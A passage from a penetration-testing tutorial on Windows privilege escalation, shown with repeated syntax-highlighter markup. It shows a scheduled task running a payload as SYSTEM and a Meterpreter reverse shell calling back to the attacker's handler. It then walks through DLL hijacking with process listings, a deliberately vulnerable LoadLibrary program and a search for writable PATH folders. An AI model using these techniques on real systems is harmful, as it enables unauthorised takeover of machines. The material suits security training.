at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
Added a new job with job ID = 1

C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Start a new handler in another terminal window for the new hi-priv shell. 1 minute later our executable will run as SYSTEM and will get a session with SYSTEM privileges:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.231
[*] Meterpreter session 6 opened (192.168.2.60:8989 -&gt; 192.168.2.231:1066) at 2017-01-05 06:42:06 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM


</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; run</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Sending </span><span class="kw1">stage</span><span class=""> </span><span class="br0">(</span><span class="nu0">957999</span><span class=""> bytes</span><span class="br0">)</span><span class=""> to </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.231</span><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Meterpreter session </span><span class="nu0">6</span><span class=""> </span><span class="kw1">opened</span><span class=""> </span><span class="br0">(</span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> -&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.231</span><span class="">:</span><span class="nu0">1066</span><span class="br0">)</span><span class=""> at </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">05</span><span class=""> </span><span class="nu0">06</span><span class="">:</span><span class="nu0">42</span><span class="">:</span><span class="nu0">06</span><span class=""> -</span><span class="nu0">0500</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">meterpreter &gt; getuid</span></li><li class=" odd"><span class="">Server username: NT AUTHORITY\SYSTEM</span></li></ol><pre style="display: none;">msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.231
[*] Meterpreter session 6 opened (192.168.2.60:8989 -&gt; 192.168.2.231:1066) at 2017-01-05 06:42:06 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<h3>DLL Hijacking</h3>
<p>Suppose that none of above methods&nbsp;worked. But of course, we did not give up. You may want to check running processes for DLL hijacking vulnerability.</p>
<p>Microsoft’s <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx">this</a> article&nbsp;explains DLL hijacking well:</p>
<blockquote><p>When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">Dynamic-Link Library Search Order</a>. If an attacker gains control of one of the directories on the DLL search path, it can place a malicious copy of the DLL in that directory. This is sometimes called a DLL preloading attack or a binary planting attack. If the system does not find a legitimate copy of the DLL before it searches the compromised directory, it loads the malicious DLL. If the application is running with administrator privileges, the attacker may succeed in local privilege elevation.</p></blockquote>
<p>When a process attempts to load a DLL, the system searches directories in the following order:</p>
<ol>
<li>The directory from which the application loaded.</li>
<li>The system directory.</li>
<li>The 16-bit system directory.</li>
<li>The Windows directory.</li>
<li>The current directory.</li>
<li>The directories that are listed in the PATH environment variable.</li>
</ol>
<p>So, to exploit this vulnerability&nbsp;we will follow this path:</p>
<ul>
<li>Check whether the DLL that process looking for exists in any directory on the disk.</li>
<li>If it does not exist, place&nbsp;the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.</li>
<li>If the DLL file already exists in any of these paths, try to place&nbsp;malicious DLL to a directory&nbsp;with a higher priority than the directory&nbsp;where the original DLL file exists. For example, if the original DLL exists in the C:\Windows directory and if we gain control of the directory which the application loaded and place a malicious copy of the DLL in that directory, when the application tries to load the DLL file, it will look at the directory which the application loaded. And it will find the malicious copy of DLL, and load it. So, our malicious code will be executed with higher privileges.</li>
</ul>
<p>Okay then. Let’s start to investigate running&nbsp;processes:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                    Path
 ---   ----  ----                    ----  -------  ----                    ----
 0     0     [System Process]                                               
 4     0     System                                                         
 80    564   svchost.exe                                                    
 308   4     smss.exe                                                       
 408   400   csrss.exe                                                      
 456   400   wininit.exe                                                    
 512   2584  SearchFilterHost.exe                                           
 564   456   services.exe                                                   
 572   456   lsass.exe                                                      
 656   564   svchost.exe                                                    
 680   564   svchost.exe                                                    
 700   564   svchost.exe                                                    
 816   564   vmacthlp.exe                                                   
 892   2584  SearchProtocolHost.exe                                         
 896   564   svchost.exe                                                    
 932   564   svchost.exe                                                    
 952   932   Vulnerable.exe                                                 
 968   2220  explorer.exe            x64   2        TARGETMACHINE\testuser  C:\Windows\explorer.exe
 972   564   svchost.exe                                                    
 996   80    WUDFHost.exe                                                   
 1104  564   spoolsv.exe                                                    
 1136  564   svchost.exe                                                    
 1324  564   svchost.exe                                                    
 1404  564   sqlwriter.exe                                                  
 1448  564   VGAuthService.exe                                              
 1460  2884  TPAutoConnect.exe       x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 1532  564   vmtoolsd.exe                                                   
 1572  80    TabTip.exe              x64   2                                
 1864  2832  dwm.exe                                                           
 1996  2568  mmc.exe                 x64   2                                
 2056  780   csrss.exe                                                      
 2224  564   msdtc.exe                                                      
 2472  932   taskhostex.exe          x64   2        TARGETMACHINE\testuser  C:\Windows\System32\taskhostex.exe
 2584  564   SearchIndexer.exe                                              
 2752  564   svchost.exe                                                    
 2832  780   winlogon.exe                                                   
 2876  952   conhost.exe                                                    
 2884  564   TPAutoConnSvc.exe                                              
 2916  896   audiodg.exe             x64   0                                
 2992  564   dllhost.exe                                                    
 3436  656   WmiPrvSE.exe                                                   
 3444  968   firefox.exe             x86   2        TARGETMACHINE\testuser  C:\Program Files (x86)\Mozilla Firefox\firefox.exe
 3480  968   vmtoolsd.exe            x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 3648  1460  conhost.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\conhost.exe
 3668  564   sppsvc.exe                                                     
 3732  1572  TabTip32.exe            x86   2                                
 3764  1752  Taskmgr.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\Taskmgr.exe</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETMACHINE\testuser</span></li><li class=" odd"><span class="">meterpreter &gt; ps</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Process List</span></li><li class=" even"><span class="">============</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""> PID   PPID  Name                    Arch  Session  User                    Path</span></li><li class=" odd"><span class=""> ---   ----  ----                    ----  -------  ----                    ----</span></li><li class=" even"><span class=""> </span><span class="nu0">0</span><span class="">     </span><span class="nu0">0</span><span class="">     </span><span class="br0">[</span><span class="">System Process</span><span class="br0">]</span><span class="">                                               </span></li><li class=" odd"><span class=""> </span><span class="nu0">4</span><span class="">     </span><span class="nu0">0</span><span class="">     System                                                         </span></li><li class=" even"><span class=""> </span><span class="nu0">80</span><span class="">    </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">308</span><span class="">   </span><span class="nu0">4</span><span class="">     smss.exe                                                       </span></li><li class=" even"><span class=""> </span><span class="nu0">408</span><span class="">   </span><span class="nu0">400</span><span class="">   csrss.exe                                                      </span></li><li class=" odd"><span class=""> </span><span class="nu0">456</span><span class="">   </span><span class="nu0">400</span><span class="">   wininit.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">512</span><span class="">   </span><span class="nu0">2584</span><span class="">  SearchFilterHost.exe                                           </span></li><li class=" odd"><span class=""> </span><span class="nu0">564</span><span class="">   </span><span class="nu0">456</span><span class="">   services.exe                                                   </span></li><li class=" even"><span class=""> </span><span class="nu0">572</span><span class="">   </span><span class="nu0">456</span><span class="">   lsass.exe                                                      </span></li><li class=" odd"><span class=""> </span><span class="nu0">656</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">680</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">700</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">816</span><span class="">   </span><span class="nu0">564</span><span class="">   vmacthlp.exe                                                   </span></li><li class=" odd"><span class=""> </span><span class="nu0">892</span><span class="">   </span><span class="nu0">2584</span><span class="">  SearchProtocolHost.exe                                         </span></li><li class=" even"><span class=""> </span><span class="nu0">896</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">932</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">952</span><span class="">   </span><span class="nu0">932</span><span class="">   Vulnerable.exe                                                 </span></li><li class=" odd"><span class=""> </span><span class="nu0">968</span><span class="">   </span><span class="nu0">2220</span><span class="">  explorer.exe            x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Windows\explorer.exe</span></li><li class=" even"><span class=""> </span><span class="nu0">972</span><span class="">   </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">996</span><span class="">   </span><span class="nu0">80</span><span class="">    WUDFHost.exe                                                   </span></li><li class=" even"><span class=""> </span><span class="nu0">1104</span><span class="">  </span><span class="nu0">564</span><span class="">   spoolsv.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">1136</span><span class="">  </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">1324</span><span class="">  </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">1404</span><span class="">  </span><span class="nu0">564</span><span class="">   sqlwriter.exe                                                  </span></li><li class=" even"><span class=""> </span><span class="nu0">1448</span><span class="">  </span><span class="nu0">564</span><span class="">   VGAuthService.exe                                              </span></li><li class=" odd"><span class=""> </span><span class="nu0">1460</span><span class="">  </span><span class="nu0">2884</span><span class="">  TPAutoConnect.exe       x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe</span></li><li class=" even"><span class=""> </span><span class="nu0">1532</span><span class="">  </span><span class="nu0">564</span><span class="">   vmtoolsd.exe                                                   </span></li><li class=" odd"><span class=""> </span><span class="nu0">1572</span><span class="">  </span><span class="nu0">80</span><span class="">    TabTip.exe              x64   </span><span class="nu0">2</span><span class="">                                </span></li><li class=" even"><span class=""> </span><span class="nu0">1864</span><span class="">  </span><span class="nu0">2832</span><span class="">  dwm.exe                                                           </span></li><li class=" odd"><span class=""> </span><span class="nu0">1996</span><span class="">  </span><span class="nu0">2568</span><span class="">  mmc.exe                 x64   </span><span class="nu0">2</span><span class="">                                </span></li><li class=" even"><span class=""> </span><span class="nu0">2056</span><span class="">  </span><span class="nu0">780</span><span class="">   csrss.exe                                                      </span></li><li class=" odd"><span class=""> </span><span class="nu0">2224</span><span class="">  </span><span class="nu0">564</span><span class="">   msdtc.exe                                                      </span></li><li class=" even"><span class=""> </span><span class="nu0">2472</span><span class="">  </span><span class="nu0">932</span><span class="">   taskhostex.exe          x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Windows\System32\taskhostex.exe</span></li><li class=" odd"><span class=""> </span><span class="nu0">2584</span><span class="">  </span><span class="nu0">564</span><span class="">   SearchIndexer.exe                                              </span></li><li class=" even"><span class=""> </span><span class="nu0">2752</span><span class="">  </span><span class="nu0">564</span><span class="">   svchost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">2832</span><span class="">  </span><span class="nu0">780</span><span class="">   winlogon.exe                                                   </span></li><li class=" even"><span class=""> </span><span class="nu0">2876</span><span class="">  </span><span class="nu0">952</span><span class="">   conhost.exe                                                    </span></li><li class=" odd"><span class=""> </span><span class="nu0">2884</span><span class="">  </span><span class="nu0">564</span><span class="">   TPAutoConnSvc.exe                                              </span></li><li class=" even"><span class=""> </span><span class="nu0">2916</span><span class="">  </span><span class="nu0">896</span><span class="">   audiodg.exe             x64   </span><span class="nu0">0</span><span class="">                                </span></li><li class=" odd"><span class=""> </span><span class="nu0">2992</span><span class="">  </span><span class="nu0">564</span><span class="">   dllhost.exe                                                    </span></li><li class=" even"><span class=""> </span><span class="nu0">3436</span><span class="">  </span><span class="nu0">656</span><span class="">   WmiPrvSE.exe                                                   </span></li><li class=" odd"><span class=""> </span><span class="nu0">3444</span><span class="">  </span><span class="nu0">968</span><span class="">   firefox.exe             x86   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Mozilla Firefox\firefox.exe</span></li><li class=" even"><span class=""> </span><span class="nu0">3480</span><span class="">  </span><span class="nu0">968</span><span class="">   vmtoolsd.exe            x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span></li><li class=" odd"><span class=""> </span><span class="nu0">3648</span><span class="">  </span><span class="nu0">1460</span><span class="">  conhost.exe             x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Windows\System32\conhost.exe</span></li><li class=" even"><span class=""> </span><span class="nu0">3668</span><span class="">  </span><span class="nu0">564</span><span class="">   sppsvc.exe                                                     </span></li><li class=" odd"><span class=""> </span><span class="nu0">3732</span><span class="">  </span><span class="nu0">1572</span><span class="">  TabTip32.exe            x86   </span><span class="nu0">2</span><span class="">                                </span></li><li class=" even"><span class=""> </span><span class="nu0">3764</span><span class="">  </span><span class="nu0">1752</span><span class="">  Taskmgr.exe             x64   </span><span class="nu0">2</span><span class="">        TARGETMACHINE\testuser  C:\Windows\System32\Taskmgr.exe</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                    Path
 ---   ----  ----                    ----  -------  ----                    ----
 0     0     [System Process]                                               
 4     0     System                                                         
 80    564   svchost.exe                                                    
 308   4     smss.exe                                                       
 408   400   csrss.exe                                                      
 456   400   wininit.exe                                                    
 512   2584  SearchFilterHost.exe                                           
 564   456   services.exe                                                   
 572   456   lsass.exe                                                      
 656   564   svchost.exe                                                    
 680   564   svchost.exe                                                    
 700   564   svchost.exe                                                    
 816   564   vmacthlp.exe                                                   
 892   2584  SearchProtocolHost.exe                                         
 896   564   svchost.exe                                                    
 932   564   svchost.exe                                                    
 952   932   Vulnerable.exe                                                 
 968   2220  explorer.exe            x64   2        TARGETMACHINE\testuser  C:\Windows\explorer.exe
 972   564   svchost.exe                                                    
 996   80    WUDFHost.exe                                                   
 1104  564   spoolsv.exe                                                    
 1136  564   svchost.exe                                                    
 1324  564   svchost.exe                                                    
 1404  564   sqlwriter.exe                                                  
 1448  564   VGAuthService.exe                                              
 1460  2884  TPAutoConnect.exe       x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 1532  564   vmtoolsd.exe                                                   
 1572  80    TabTip.exe              x64   2                                
 1864  2832  dwm.exe                                                           
 1996  2568  mmc.exe                 x64   2                                
 2056  780   csrss.exe                                                      
 2224  564   msdtc.exe                                                      
 2472  932   taskhostex.exe          x64   2        TARGETMACHINE\testuser  C:\Windows\System32\taskhostex.exe
 2584  564   SearchIndexer.exe                                              
 2752  564   svchost.exe                                                    
 2832  780   winlogon.exe                                                   
 2876  952   conhost.exe                                                    
 2884  564   TPAutoConnSvc.exe                                              
 2916  896   audiodg.exe             x64   0                                
 2992  564   dllhost.exe                                                    
 3436  656   WmiPrvSE.exe                                                   
 3444  968   firefox.exe             x86   2        TARGETMACHINE\testuser  C:\Program Files (x86)\Mozilla Firefox\firefox.exe
 3480  968   vmtoolsd.exe            x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 3648  1460  conhost.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\conhost.exe
 3668  564   sppsvc.exe                                                     
 3732  1572  TabTip32.exe            x86   2                                
 3764  1752  Taskmgr.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\Taskmgr.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>As you can see, if we are using low-priv shell&nbsp;we cannot see the details about processes which running&nbsp;with higher privileges, such as user, path, architecture. But we can understand which processes running with higher privileges than ours. If one of these processes have some weaknesses we can exploit it to escalate our privileges.</p>
<p>While investigating processes, Vulnerable.exe caught my attention. Let’s&nbsp;find it’s location and download it:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; search -f Vulnerable.exe
Found 1 result...
    C:\Windows\SysWOW64\Vulnerable.exe (31232 bytes)
meterpreter &gt; cd C:/Windows/SysWOW64
meterpreter &gt; download Vulnerable.exe
[*] downloading: Vulnerable.exe -&gt; Vulnerable.exe
[*] download   : Vulnerable.exe -&gt; Vulnerable.exe
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; search -f Vulnerable.exe</span></li><li class=" even"><span class="">Found </span><span class="nu0">1</span><span class=""> result...</span></li><li class=" odd"><span class="">    C:\Windows\SysWOW64\Vulnerable.</span><span class="kw1">exe</span><span class=""> </span><span class="br0">(</span><span class="nu0">31232</span><span class=""> bytes</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">meterpreter &gt; cd C:/Windows/SysWOW64</span></li><li class=" odd"><span class="">meterpreter &gt; download Vulnerable.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> downloading: Vulnerable.exe -&gt; Vulnerable.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> download   : Vulnerable.exe -&gt; Vulnerable.exe</span></li></ol><pre style="display: none;">meterpreter &gt; search -f Vulnerable.exe
Found 1 result...
    C:\Windows\SysWOW64\Vulnerable.exe (31232 bytes)
meterpreter &gt; cd C:/Windows/SysWOW64
meterpreter &gt; download Vulnerable.exe
[*] downloading: Vulnerable.exe -&gt; Vulnerable.exe
[*] download   : Vulnerable.exe -&gt; Vulnerable.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>When we examine it a little bit, we will realize that it tries to load a DLL named <em>hijackable.dll</em>.</p>
<p><img class="alignnone wp-image-715" src="./Windows Privilege Escalation Methods_files/hijackable-dll-300x145.png" alt="" width="692" height="335" srcset="https://pentest.blog/wp-content/uploads/hijackable-dll-300x145.png 300w, https://pentest.blog/wp-content/uploads/hijackable-dll.png 692w" sizes="(max-width: 692px) 100vw, 692px"></p>
<p>The easiest way to detect&nbsp;DLL hijacking vulnerability is using <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx">Procmon</a> tool.</p>
<p>To see the results more easily, you should add these 3 filters:</p>
<p><img class="alignnone wp-image-771" src="./Windows Privilege Escalation Methods_files/dll_hijack_procmon_new-300x179.png" alt="" width="519" height="310" srcset="https://pentest.blog/wp-content/uploads/dll_hijack_procmon_new-300x179.png 300w, https://pentest.blog/wp-content/uploads/dll_hijack_procmon_new.png 519w" sizes="(max-width: 519px) 100vw, 519px"></p>
<p>&nbsp;</p>
<p>After adding filters, when you execute <em>Vulnerable.exe</em>, failed DLL loads will be listed:</p>
<p><img class="alignnone wp-image-767" src="./Windows Privilege Escalation Methods_files/dll_hijack_procmon-2-300x172.png" alt="" width="755" height="433" srcset="https://pentest.blog/wp-content/uploads/dll_hijack_procmon-2-300x172.png 300w, https://pentest.blog/wp-content/uploads/dll_hijack_procmon-2.png 755w" sizes="(max-width: 755px) 100vw, 755px"></p>
<p>As shown above, Windows attempts to locate the&nbsp;<em>hijackable.dll</em>&nbsp;by searching a well-defined set of directories.</p>
<p>In this scenario, Vulnerable.exe&nbsp;has DLL hijacking vulnerability. Ok I confess, actually, this executable is a simple code that loads a DLL without doing some checks:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-highlight="6" style="display: none;">#include "stdafx.h"
#include "windows.h"

void _tmain(int argc, _TCHAR* argv[]) 
{ 
  LoadLibrary(L"hijackable.dll"); 
}</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="kw2">#include "stdafx.h"</span><span class=""></span></li><li class=" even"><span class=""></span><span class="kw2">#include "windows.h"</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""></span><span class="kw1">void</span><span class=""> </span><span class="de1">_tmain</span><span class="br0">(</span><span class="kw1">int</span><span class=""> argc, _TCHAR* argv</span><span class="br0">[</span><span class="br0">]</span><span class="br0">)</span><span class=""> </span></li><li class=" odd"><span class=""></span><span class="br0">{</span><span class=""> </span></li><li class="specialline even"><span class="">  </span><span class="de1">LoadLibrary</span><span class="br0">(</span><span class="">L</span><span class="st1">"hijackable.dll"</span><span class="br0">)</span><span class="">; </span></li><li class=" odd"><span class=""></span><span class="br0">}</span></li></ol><pre style="display: none;">#include "stdafx.h"
#include "windows.h"

void _tmain(int argc, _TCHAR* argv[]) 
{ 
  LoadLibrary(L"hijackable.dll"); 
}</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Let’s check if&nbsp;<em>hijackable.dll</em> exists on the target machine:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1-2" style="display: none;">meterpreter &gt; search -f hijackable.dll
No files matching your search were found.
meterpreter &gt; 
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; search -f hijackable.dll</span></li><li class="specialline even"><span class="">No files matching your search were found.</span></li><li class=" odd"><span class="">meterpreter &gt; </span></li></ol><pre style="display: none;">meterpreter &gt; search -f hijackable.dll
No files matching your search were found.
meterpreter &gt; </pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>It seems that DLL does not exist on the machine. But we cannot be sure at this point, maybe it exists in a directory that we don’t have permission to view. Don’t forget we still have low privileges. <img draggable="false" class="emoji" alt="🙁" src="./Windows Privilege Escalation Methods_files/1f641.svg"></p>
<p>The next step is checking possible weak folder permissions. I usually check if a software gets installed in the root directory such as Python. Because if a folder created in the root directory, it is writable for all authenticated users by default. And softwares like Python, Ruby, Perl etc. usually added to PATH variable.</p>
<p>Remember, Windows checks the directories that are listed in the PATH environment variable!</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="17" style="display: none;">meterpreter &gt; ls
Listing: C:\
============

Mode              Size        Type  Last modified              Name
----              ----        ----  -------------              ----
40777/rwxrwxrwx   0           dir   2017-01-18 05:59:21 -0500  $Recycle.Bin
100666/rw-rw-rw-  1           fil   2013-06-18 08:18:29 -0400  BOOTNXT
100444/r--r--r--  8192        fil   2013-09-11 14:11:46 -0400  BOOTSECT.BAK
40777/rwxrwxrwx   0           dir   2016-11-19 15:49:57 -0500  Boot
40777/rwxrwxrwx   0           dir   2013-08-22 10:45:52 -0400  Documents and Settings
40555/r-xr-xr-x   0           dir   2016-07-27 07:12:06 -0400  MSOCache
40777/rwxrwxrwx   0           dir   2013-08-22 11:22:35 -0400  PerfLogs
40555/r-xr-xr-x   0           dir   2017-01-18 04:05:59 -0500  Program Files
40555/r-xr-xr-x   0           dir   2017-01-18 04:07:04 -0500  Program Files (x86)
40777/rwxrwxrwx   0           dir   2017-01-18 04:05:28 -0500  ProgramData
40777/rwxrwxrwx   0           dir   2017-01-18 09:51:36 -0500  Python27
40777/rwxrwxrwx   0           dir   2013-09-11 13:15:09 -0400  Recovery
40777/rwxrwxrwx   0           dir   2017-01-18 03:52:51 -0500  System Volume Information
40555/r-xr-xr-x   0           dir   2017-01-04 21:51:12 -0500  Users
40777/rwxrwxrwx   0           dir   2017-01-18 03:53:05 -0500  Windows
100444/r--r--r--  404250      fil   2014-06-14 06:46:09 -0400  bootmgr
100666/rw-rw-rw-  1409286144  fil   2017-01-18 13:53:34 -0500  pagefile.sys
100666/rw-rw-rw-  16777216    fil   2017-01-18 13:53:34 -0500  swapfile.sys
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; ls</span></li><li class=" even"><span class="">Listing: C:\</span></li><li class=" odd"><span class="">============</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Mode              Size        Type  Last modified              Name</span></li><li class=" even"><span class="">----              ----        ----  -------------              ----</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">05</span><span class="">:</span><span class="nu0">59</span><span class="">:</span><span class="nu0">21</span><span class=""> -</span><span class="nu0">0500</span><span class="">  $Recycle.Bin</span></li><li class=" even"><span class=""></span><span class="nu0">100666</span><span class="">/rw-rw-rw-  </span><span class="nu0">1</span><span class="">           fil   </span><span class="nu0">2013</span><span class="">-</span><span class="nu0">06</span><span class="">-</span><span class="nu0">18</span><span class=""> </span><span class="nu0">08</span><span class="">:</span><span class="nu0">18</span><span class="">:</span><span class="nu0">29</span><span class=""> -</span><span class="nu0">0400</span><span class="">  BOOTNXT</span></li><li class=" odd"><span class=""></span><span class="nu0">100444</span><span class="">/r--r--r--  </span><span class="nu0">8192</span><span class="">        fil   </span><span class="nu0">2013</span><span class="">-</span><span class="nu0">09</span><span class="">-</span><span class="nu0">11</span><span class=""> </span><span class="nu0">14</span><span class="">:</span><span class="nu0">11</span><span class="">:</span><span class="nu0">46</span><span class=""> -</span><span class="nu0">0400</span><span class="">  BOOTSECT.BAK</span></li><li class=" even"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2016</span><span class="">-</span><span class="nu0">11</span><span class="">-</span><span class="nu0">19</span><span class=""> </span><span class="nu0">15</span><span class="">:</span><span class="nu0">49</span><span class="">:</span><span class="nu0">57</span><span class=""> -</span><span class="nu0">0500</span><span class="">  Boot</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">           dir   </span><span class="nu0">2013</span><span class="">-</span><span class="nu0">08</span><span class="">-</span><span class="nu0">22</span><span class=""> </span><span class="nu0">10</span><span class="">:</span><span class="nu0">45</span><span class="">:</span><span class="nu0">52</span><span class=""> -</span><span class="nu0">0400</span><span class="">  Documents and Settings</span></li><li class=" even"><span class=""></span><span 